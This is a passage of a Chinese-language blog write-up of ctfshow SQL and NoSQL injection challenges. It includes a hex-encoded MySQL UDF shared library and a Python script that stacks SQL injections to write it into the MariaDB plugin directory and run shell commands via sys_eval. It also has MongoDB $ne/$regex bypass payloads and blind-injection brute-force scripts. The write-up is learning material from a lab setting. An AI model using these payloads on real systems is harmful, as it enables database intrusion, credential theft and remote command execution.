000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#x27;</span></span><br><span class="line">codes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(code), <span class="number">128</span>):</span><br><span class="line">    codes.append(code[i:<span class="built_in">min</span>(i + <span class="number">128</span>, <span class="built_in">len</span>(code))])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建临时表</span></span><br><span class="line">sql = <span class="string">&#x27;&#x27;&#x27;create table temp(data longblob)&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空临时表</span></span><br><span class="line">sql = <span class="string">&#x27;&#x27;&#x27;delete from temp&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入第一段数据</span></span><br><span class="line">sql = <span class="string">&#x27;&#x27;&#x27;insert into temp(data) values (0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[<span class="number">0</span>])</span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新连接剩余数据</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(codes)):</span><br><span class="line">    sql = <span class="string">&#x27;&#x27;&#x27;update temp set data = concat(data,0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[k])</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">    requests.get(url + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.3.18-MariaDB</span></span><br><span class="line"><span class="comment"># 写入so文件</span></span><br><span class="line">sql = <span class="string">&#x27;&#x27;&#x27;select data from temp into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so\&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 引入自定义函数</span></span><br><span class="line">sql = <span class="string">&#x27;&#x27;&#x27;create function sys_eval returns string soname &#x27;udf.so\&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令执行，结果更新到界面</span></span><br><span class="line">sql = <span class="string">&#x27;&#x27;&#x27;update ctfshow_user set pass=(select sys_eval(&#x27;cat /flag.her?&#x27;))&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看结果</span></span><br><span class="line">r = requests.get(url[:-<span class="number">4</span>] + <span class="string">&#x27;?page=1&amp;limit=10&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="nosql注入"><a href="#nosql注入" class="headerlink" title="nosql注入"></a>nosql注入</h2><h3 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//无</span><br><span class="line">$user = $memcache-&gt;get($id);</span><br></pre></td></tr></table></figure>

<p>无过滤的nosql，是使用了memcache类中的get方法去返回数据的</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250521174653751.png" alt="image-20250521174653751"></p>
<p>当 <code>get()</code> 接收到一个数组时，它会尝试获取数组中所有元素对应的键。</p>
<p>所以这里直接用数组绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[]=flag</span><br></pre></td></tr></table></figure>

<h3 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h3><p>首先看下查询语句和返回逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sql语句</span><br><span class="line"></span><br><span class="line">  $query = new MongoDB\Driver\Query($data);</span><br><span class="line">  $cursor = $manager-&gt;executeQuery(&#x27;ctfshow.ctfshow_user&#x27;, $query)-&gt;toArray();</span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line">  //无过滤</span><br><span class="line">  if(count($cursor)&gt;0)&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br><span class="line">    array_push($ret[&#x27;data&#x27;], $flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这里的用的MongoDB\Driver\Manager::executeQuery方法去进行执行数据库查询的</p>
<p>如果返回数据大于0的话就会显示登录成功，但是这里的话我们是不知道具体的数据有哪些的</p>
<p>这里的话可以用操作符去进行重言式注入</p>
<p>在mongodb中，要求的查询语句是json格式，如<code>&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;&#125;</code>，在php中，json就是数组，也就是<code>Array(&#39;username&#39;=&gt; &#39;admin&#39;, &#39;password&#39;=&gt; &#39;admin&#39;)</code>，同时MongoDB要求的json格式中，是可以利用操作符进行条件查询的，例如如这样的json: <code>&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &#123;&quot;$regex&quot;: &#39;^abc$&#39;&#125;&#125;</code>，会匹配密码abc，也就是说，如果键对应的值是一个字符串，那么就相当于条件等于，只不过省去了json，如果键对应的值是json对象，就代表是条件查询</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = array(&quot;username&quot; =&gt; &quot;admin&quot;, &quot;password&quot; =&gt; array(&quot;\$ne&quot; =&gt; 1));测一下</span><br></pre></td></tr></table></figure>

<p>查询我们的username为admin但password不为1的内容</p>
<p>所以我们的payload</p>
<p>注入点在&#x2F;api&#x2F;中post传参</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>

<p>通过构造 <code>password[$ne]=1</code>，可以绕过对 <code>password</code> 字段的精确匹配，只要 <code>password</code> 不等于 <code>1</code>，查询就会成功。</p>
<h3 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h3><p>也是无过滤，继续上次的payload，但是发现用户为admin的password不是flag，看看非admin用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$ne]=admin&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>

<p>发现一个flag用户密码为flag</p>
<h3 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h3><p>sql语句变了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//sql</span><br><span class="line"> db.ctfshow_user.find(&#123;username:&#x27;$username&#x27;,password:&#x27;$password&#x27;&#125;).pretty()</span><br></pre></td></tr></table></figure>

<p>这个的话就是MongoDB的查询文档语句了</p>
<p>用上题的payload发现出来一个admin1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$ne]=1&amp;password[$regex]=ctfshow&#123;</span><br></pre></td></tr></table></figure>

<p>这里的话用regex去匹配密码为<code>ctfshow&#123;</code>的结果</p>
<p>还有其他几个payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]=^[^admin]&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>

<h3 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h3><p>传入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$ne]=1&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>

<p>发现显示查询成功但是并没有回显，只能打盲注了，但是这里不知道username是什么，先爆一下username</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">table = string.digits+string.ascii_lowercase+string.ascii_uppercase+<span class="string">&#x27;_&#123;&#125;-,&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3a2976ee-9b69-4dae-a8cb-44a6906cacef.challenge.ctf.show/api/&quot;</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">        temp_target = target + j</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username[$regex]&quot;</span>: <span class="string">f&quot;^[^admin]<span class="subst">&#123;temp_target&#125;</span>.*$&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password[$ne]&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u767b\u9646\u6210\u529f&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target += j</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line">//ql_flag</span><br></pre></td></tr></table></figure>

<p>这里的话会查出开头不是admin的其他用户名，然后根据这个用户名爆flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">table = string.digits+string.ascii_lowercase+string.ascii_uppercase+<span class="string">&#x27;_&#123;&#125;-,&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3a2976ee-9b69-4dae-a8cb-44a6906cacef.challenge.ctf.show/api/&quot;</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">        temp_target = target + j</span><br><span class="line">        data1 = &#123;</span><br><span class="line">            <span class="string">&quot;username[$regex]&quot;</span>: <span class="string">f&quot;^[^admin]<span class="subst">&#123;temp_target&#125;</span>.*$&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password[$ne]&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#r = requests.post(url, data=data1)</span></span><br><span class="line">        payload2 = <span class="string">f&#x27;^<span class="subst">&#123;temp_target&#125;</span>.*$&#x27;</span></span><br><span class="line">        data2 = &#123;</span><br><span class="line">            <span class="string">&#x27;username[$regex]&#x27;</span>: <span class="string">&#x27;^[^admin]ql_flag&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password[$regex]&#x27;</span>: payload2</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u767b\u9646\u6210\u529f&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target += j</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实这次也算第二次做了，之前只是做了一半，这次重新开始做，但总体的速度还是不错的，整个花了四天左右去做完了，虽然题不多但是含金量真的挺高的，学到了很多注入的方法和绕过手法</p>
<p>特别是感觉到这次做的时候比上次做收获更大，学到了更多的东西，对sql的理解也更透彻了一些</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">H0me</a></li>
        
          <li><a href="/about/">A6out</a></li>
        
          <li><a href="/tags/">T6gs</a></li>
        
          <li><a href="/categories/">Catagory</a></li>
        
          <li><a href="/links/">L1nks</a></li>
        
          <li><a href="/search/">s4arch</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">未过滤注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web171"><span class="toc-number">1.1.</span> <span class="toc-text">web171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web172"><span class="toc-number">1.2.</span> <span class="toc-text">web172</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web173"><span class="toc-number">1.3.</span> <span class="toc-text">web173</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web174"><span class="toc-number">1.4.</span> <span class="toc-text">web174</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web175"><span class="toc-number">1.5.</span> <span class="toc-text">web175</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">过滤注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web176"><span class="toc-number">2.1.</span> <span class="toc-text">web176</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web177"><span class="toc-number">2.2.</span> <span class="toc-text">web177</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web178"><span class="toc-number">2.3.</span> <span class="toc-text">web178</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web179"><span class="toc-number">2.4.</span> <span class="toc-text">web179</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web180"><span class="toc-number">2.5.</span> <span class="toc-text">web180</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web181"><span class="toc-number">2.6.</span> <span class="toc-text">web181</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web182"><span class="toc-number">2.7.</span> <span class="toc-text">web182</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web183"><span class="toc-number">2.8.</span> <span class="toc-text">web183</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web184"><span class="toc-number">2.9.</span> <span class="toc-text">web184</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web185"><span class="toc-number">2.10.</span> <span class="toc-text">web185</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web186"><span class="toc-number">2.11.</span> <span class="toc-text">web186</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web187"><span class="toc-number">2.12.</span> <span class="toc-text">web187</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web188"><span class="toc-number">2.13.</span> <span class="toc-text">web188</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web189"><span class="toc-number">2.14.</span> <span class="toc-text">web189</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web190"><span class="toc-number">3.1.</span> <span class="toc-text">web190</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web191"><span class="toc-number">3.2.</span> <span class="toc-text">web191</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web192"><span class="toc-number">3.3.</span> <span class="toc-text">web192</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web193-194"><span class="toc-number">3.4.</span> <span class="toc-text">web193&amp;194</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web195"><span class="toc-number">4.1.</span> <span class="toc-text">web195</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web196"><span class="toc-number">4.2.</span> <span class="toc-text">web196</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web197"><span class="toc-number">4.3.</span> <span class="toc-text">web197</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web198"><span class="toc-number">4.4.</span> <span class="toc-text">web198</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web199-200"><span class="toc-number">4.5.</span> <span class="toc-text">web199&amp;200</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0sqlmap"><span class="toc-number">5.</span> <span class="toc-text">练习sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web201"><span class="toc-number">5.1.</span> <span class="toc-text">web201</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web202"><span class="toc-number">5.2.</span> <span class="toc-text">web202</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web203"><span class="toc-number">5.3.</span> <span class="toc-text">web203</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web204"><span class="toc-number">5.4.</span> <span class="toc-text">web204</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web205"><span class="toc-number">5.5.</span> <span class="toc-text">web205</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web206"><span class="toc-number">5.6.</span> <span class="toc-text">web206</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web207"><span class="toc-number">5.7.</span> <span class="toc-text">web207</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web208"><span class="toc-number">5.8.</span> <span class="toc-text">web208</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web209"><span class="toc-number">5.9.</span> <span class="toc-text">web209</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web210"><span class="toc-number">5.10.</span> <span class="toc-text">web210</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web211"><span class="toc-number">5.11.</span> <span class="toc-text">web211</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web212"><span class="toc-number">5.12.</span> <span class="toc-text">web212</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web213"><span class="toc-number">5.13.</span> <span class="toc-text">web213</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web214"><span class="toc-number">6.1.</span> <span class="toc-text">web214</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web215"><span class="toc-number">6.2.</span> <span class="toc-text">web215</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web216"><span class="toc-number">6.3.</span> <span class="toc-text">web216</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web217"><span class="toc-number">6.4.</span> <span class="toc-text">web217</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web218"><span class="toc-number">6.5.</span> <span class="toc-text">web218</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web219"><span class="toc-number">6.6.</span> <span class="toc-text">web219</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web220"><span class="toc-number">6.7.</span> <span class="toc-text">web220</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">其他注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#limit%E6%B3%A8%E5%85%A5"><span class="toc-number">7.1.</span> <span class="toc-text">limit注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web221"><span class="toc-number">7.2.</span> <span class="toc-text">web221</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#group%E6%B3%A8%E5%85%A5"><span class="toc-number">7.3.</span> <span class="toc-text">group注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web222"><span class="toc-number">7.4.</span> <span class="toc-text">web222</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web223"><span class="toc-number">7.5.</span> <span class="toc-text">web223</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web224"><span class="toc-number">7.6.</span> <span class="toc-text">web224</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E6%8F%90%E5%8D%87"><span class="toc-number">7.7.</span> <span class="toc-text">堆叠注入提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web225"><span class="toc-number">7.8.</span> <span class="toc-text">web225</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web226"><span class="toc-number">7.9.</span> <span class="toc-text">web226</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web227"><span class="toc-number">7.10.</span> <span class="toc-text">web227</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web228-230"><span class="toc-number">7.11.</span> <span class="toc-text">web228-230</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#update-%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">update 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web231"><span class="toc-number">8.1.</span> <span class="toc-text">web231</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web232"><span class="toc-number">8.2.</span> <span class="toc-text">web232</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web233"><span class="toc-number">8.3.</span> <span class="toc-text">web233</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web234"><span class="toc-number">8.4.</span> <span class="toc-text">web234</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web235"><span class="toc-number">8.5.</span> <span class="toc-text">web235</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web236"><span class="toc-number">8.6.</span> <span class="toc-text">web236</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#insert-%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">insert 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web237"><span class="toc-number">9.1.</span> <span class="toc-text">web237</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web238"><span class="toc-number">9.2.</span> <span class="toc-text">web238</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web239"><span class="toc-number">9.3.</span> <span class="toc-text">web239</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web240"><span class="toc-number">9.4.</span> <span class="toc-text">web240</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#delete-%E6%B3%A8%E5%85%A5"><span class="toc-number">10.</span> <span class="toc-text">delete 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web241"><span class="toc-number">10.1.</span> <span class="toc-text">web241</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file%E6%A8%A1%E5%9D%97"><span class="toc-number">11.</span> <span class="toc-text">file模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web242"><span class="toc-number">11.1.</span> <span class="toc-text">web242</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web243"><span class="toc-number">11.2.</span> <span class="toc-text">web243</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">12.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web244"><span class="toc-number">12.1.</span> <span class="toc-text">web244</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web245"><span class="toc-number">12.2.</span> <span class="toc-text">web245</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web246"><span class="toc-number">12.3.</span> <span class="toc-text">web246</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web247"><span class="toc-number">12.4.</span> <span class="toc-text">web247</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 